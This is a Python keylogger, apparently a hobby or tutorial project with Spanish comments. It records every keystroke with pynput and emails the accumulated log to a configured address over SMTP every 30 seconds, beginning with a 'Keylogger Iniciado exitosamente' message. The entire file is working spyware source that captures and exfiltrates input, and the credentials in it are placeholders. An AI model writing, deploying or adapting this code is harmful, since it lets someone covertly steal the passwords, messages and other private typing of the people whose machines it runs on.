
import pynput.keyboard
import threading

import smtplib
from email.mime.text import MIMEText

class keylogger:
    

    
    def __init__(self):
        self.log = ""
        # Variable para saber si se ha presionado la tecla de apagado
        self.request_shutdown = False
        # Variable para el timer
        self.timer = None
        
        # Variable para saber si es la primera vez que se ejecuta el keylogger
        self.is_first_run = True
        
        # Variables para el envío de emails
        self.sender = "youemail@email.com"
        self.recipients = "[your@email.com]"
        self.password = "yourpassword"
        self.ip_server = "192.168.100.51"

            
    def pressed_key(self,key):
                
        try:
            # Si la tecla presionada es una tecla de texto (a, b, c, etc)
            # Se añade al log
            self.log = self.log + str(key.char)
        except AttributeError:
            # Si la tecla presionada no es una tecla de texto (enter, shift, etc)
            # Se crea un diccionario con las teclas especiales
            special_keys = {
                key.space: " ",
                key.enter: " Enter ",
                key.shift: " Shift ",
                key.shift_r: " Shift ",
                key.ctrl: " Ctrl ",
                key.ctrl_r: " Ctrl ",
                key.alt: " Alt ",
                key.alt_r: " Alt ",
                key.esc: " Esc ",
                key.backspace: " Backspace "
            }
            # Si la tecla presionada está en el diccionario de teclas especiales
            # Se añade al log
            # Si no, se añade la tecla como un string        
            self.log = self.log + special_keys.get(key, f" {str(key)} ")
        
        print(self.log)

    
    def send_email(self,subject, body, sender, recipients, password):
        
        # Añadimos el cuerpo del mensaje y el asunto
        msg = MIMEText(body)  
        msg['Subject'] = subject  
        msg['From'] = sender  
        msg['To'] = ', '.join(recipients)  
        
        # Enviamos el email
        with smtplib.SMTP_SSL('smtp.serviciodecorreo.es', 465) as smtp_server:   
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print("Email sent Successfully!")
        
    
    def report(self):
        
        
        # Si es la primera vez que se ejecuta el keylogger
        # Se envía un email con el asunto "Keylogger Iniciado exitosamente"
        
        email_body = "[+] Keylogger Iniciado exitosamente\n\n" if self.is_first_run else self.log
        self.send_email("Keylogger report", email_body, self.sender, self.recipients,self.password)
        self.log = ""
        
        # Si es la primera vez que se ejecuta el keylogger
        # Cambiamos la variable is_first_run a False
        # Para que no se vuelva a enviar el primer email
        if self.is_first_run:
            self.is_first_run = False
        
        # Si no se ha presionado la tecla de apagado
        if not self.request_shutdown:
            # Cada 10 segundos se borra la información del log
            # Y se vuelve a llama a la función report
            timer = threading.Timer(30, self.report)
            timer.start()
    
    def shutdown(self):
        # Si se presiona la tecla de apagado
        # Se cancela el timer y sus hilos
        self.request_shutdown = True
        
        # Si el timer no es nulo
        if self.timer:
            self.timer.cancel()
    
    def start(self):
        # Creaos un listener de teclado
        # Este listener se encargará de escuchar las teclas que se presionan
        # Cada tecla se enviará a la función pressed_key
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)




        # Creamos un manejador de contexto para el listener
        # Si el listener falla, se cerrará el listener
        with keyboard_listener:
           self.report()
           keyboard_listener.join()
        
    
  
